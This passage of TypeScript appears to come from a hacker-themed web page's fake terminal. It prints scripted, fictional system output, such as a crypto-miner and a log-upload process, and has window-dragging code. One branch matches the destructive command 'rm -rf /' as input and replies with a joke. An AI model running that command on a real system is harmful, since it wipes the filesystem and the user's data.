            this.addLine(`uid=1000(${this.username}) gid=1000(${this.username}) groups=1000(${this.username}),27(sudo)`)
            return
        }

        if (cmd === 'uptime') {
            const days = Math.floor(Math.random() * 365)
            const hours = Math.floor(Math.random() * 24)
            const mins = String(Math.floor(Math.random() * 60)).padStart(2, '0')
            this.addLine(`up ${days} days, ${hours}:${mins}`)
            return
        }

        if (cmd === 'ifconfig') {
            this.addLine('eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>')
            this.addLine('      inet 192.168.1.105  netmask 255.255.255.0')
            this.addLine('      gateway 10.13.13.1  <== default gateway changed')
            this.addLine('      ether 00:1A:2B:3C:4D:5E')
            this.addLine('      RX packets: 184203  TX packets: 97412')
            this.addLine('')
            this.addLine('lo: flags=73<UP,LOOPBACK,RUNNING>')
            this.addLine('      inet 127.0.0.1  netmask 255.0.0.0')
            return
        }

        if (cmd === 'netstat') {
            this.addLine('Active connections:')
            this.addLine('tcp  0  0  192.168.1.105:22     185.220.101.34:44721  ESTABLISHED')
            this.addLine('tcp  0  0  192.168.1.105:4721   10.13.13.7:4721       ESTABLISHED')
            this.addLine('tcp  0  0  192.168.1.105:443    0.0.0.0:*             LISTEN')
            this.addLine('tcp  0  0  192.168.1.105:80     0.0.0.0:*             LISTEN')
            this.addLine('tcp  0  0  127.0.0.1:9050       0.0.0.0:*             LISTEN')
            this.addLine('udp  0  0  192.168.1.105:53     10.13.13.7:53         ESTABLISHED')
            this.addLine('')
            this.addLine('WARNING: Outbound connection to 10.13.13.7 has no parent process.')
            return
        }

        if (cmd === 'sudo' || cmd.startsWith('sudo ')) {
            this.addLine('Nice try.')
            return
        }

        if (cmd === 'su root') {
            this.addLine('Nice try.')
            return
        }

        if (cmd === 'exit') {
            this.addLine('There is no escape.')
            return
        }

        if (cmd.startsWith('echo ')) {
            this.addLine(cmd.slice(5))
            return
        }

        if (cmd === 'rm -rf /') {
            this.addLine('Nice try. System protected.')
            return
        }

        if (cmd === ':q' || cmd === ':q!' || cmd === ':wq') {
            this.addLine('This is not vim.')
            return
        }

        if (cmd === 'history') {
            this.addLine('Command history disabled for security.')
            return
        }

        if (cmd === 'top' || cmd === 'htop') {
            this.addLine('PID   CPU%  MEM%  COMMAND')
            this.addLine('1     0.1   0.4   systemd')
            this.addLine('42    0.0   0.1   cron')
            this.addLine('89    0.0   0.1   sshd')
            this.addLine('142   2.3   1.2   l0k1-terminal')
            this.addLine('187   0.0   0.2   tor-relay')
            this.addLine('203   0.1   0.3   vpn-tunnel')
            this.addLine('301   45.2  12.8  crypto-miner  <== suspicious')
            this.addLine('377   0.3   0.1   .pipe_stream --silent')
            this.addLine('389   0.1   0.1   upload_logs.sh -> 10.13.13.7')
            this.addLine('404   0.0   0.0   /dev/video0 [no user bound]')
            this.addLine('511   0.0   0.1   watcher')
            this.addLine('666   6.6   6.6   ???')
            return
        }

        if (cmd === 'ps' || cmd === 'ps aux') {
            this.addLine('PID  TTY   TIME     CMD')
            this.addLine('1    pts/0 00:00:01 systemd')
            this.addLine('42   pts/0 00:00:00 cron')
            this.addLine('89   pts/0 00:00:03 sshd')
            this.addLine('142  pts/0 00:00:12 l0k1-terminal')
            this.addLine('187  pts/0 00:00:45 tor-relay')
            this.addLine('203  pts/0 00:00:22 vpn-tunnel')
            this.addLine('301  pts/0 00:15:42 crypto-miner')
            this.addLine('377  ?     00:00:07 .pipe_stream --silent')
            this.addLine('389  ?     00:01:33 upload_logs.sh')
            this.addLine('404  ?     00:00:00 /dev/video0')
            this.addLine('511  ?     00:00:00 watcher')
            return
        }

        if (cmd === 'free' || cmd === 'free -h') {
            this.addLine('               total   used    free    shared  cache')
            this.addLine('Mem:           16Gi    8.2Gi   3.1Gi   0.5Gi   4.7Gi')
            this.addLine('Swap:          2Gi     1.8Gi   0.2Gi')
            this.addLine('')
            this.addLine('WARNING: High swap usage detected. Possible memory leak.')
            return
        }

        if (cmd === 'df' || cmd === 'df -h') {
            this.addLine('Filesystem  Size  Used  Avail  Use%  Mounted on')
            this.addLine('/dev/sda1   500G  234G  266G   47%   /')
            this.addLine('/dev/sda2   100G  98G   2G     98%   /var/log')
            this.addLine('/dev/sdb1   1T    890G  110G   89%   /data')
            this.addLine('tmpfs       8G    4.2G  3.8G   53%   /tmp')
            this.addLine('')
            this.addLine('WARNING: /var/log almost full. Someone is watching.')
            return
        }

        // neofetch - ascii logo + system info
        if (cmd === 'neofetch') {
            const logo = [
                '  ██╗      ██████╗ ██╗  ██╗ ██╗',
                '  ██║     ██╔═══██╗██║ ██╔╝███║',
                '  ██║     ██║   ██║█████╔╝ ╚██║',
                '  ██║     ██║   ██║██╔═██╗  ██║',
                '  ███████╗╚██████╔╝██║  ██╗ ██║',
                '  ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═╝',
            ]
            logo.forEach(line => {
                const p = document.createElement('p')
                p.textContent = line
                p.classList.add('neofetch-logo')
                this.outputEl.appendChild(p)
            })
            this.addLine('')
            this.addLine('OS: L0K1 OS 1.0.0 x86_64')
            this.addLine('Host: ' + this.username + '-node')
            this.addLine('Kernel: 6.1.0-l0k1')
            this.addLine('Shell: l0k1-sh 1.0')
            this.addLine('Terminal: L0K1 Terminal')
            return
        }

        // fallback - zkusi najit prikaz v commands objektu
        for (const key of Object.keys(this.commands)) {
            if (cmd.startsWith(key + ' ') || cmd === key) {
                const args = cmd.slice(key.length + 1)
                const response = this.commands[key](args)
                if (response) this.addLine(response)
                return
            }
        }

        this.addLine('Command not found: ' + cmd + '. Type "help" for commands.')
    }
}

// dragovani okna terminalu
const win = document.getElementById('window')!
const titlebar = document.getElementById('window-titlebar')!
const wrapper = document.getElementById('menu-wrapper')!

function centerWindow() {
    const wr = wrapper.getBoundingClientRect()
    win.style.left = (wr.width - win.offsetWidth) / 2 + 'px'
    win.style.top = (wr.height - win.offsetHeight) / 2 + 'px'
}
centerWindow()
window.addEventListener('resize', centerWindow)

let dragX = 0, dragY = 0, dragging = false

titlebar.addEventListener('mousedown', (e) => {
    dragging = true
    dragX = e.clientX - win.offsetLeft
    dragY = e.clientY - win.offsetTop
})

document.addEventListener('mousemove', (e) => {
    if (!dragging) return
    const wr = wrapper.getBoundingClientRect()
    let x = e.clientX - dragX
    let y = e.clientY - dragY
    x = Math.max(0, Math.min(x, wr.width - win.offsetWidth))
    y = Math.max(0, Math.min(y, wr.height - win.offsetHeight))
    win.style.left = x + 'px'
    win.style.top = y + 'px'
})

document.addEventListener('mouseup', () => {
    dragging = false
})

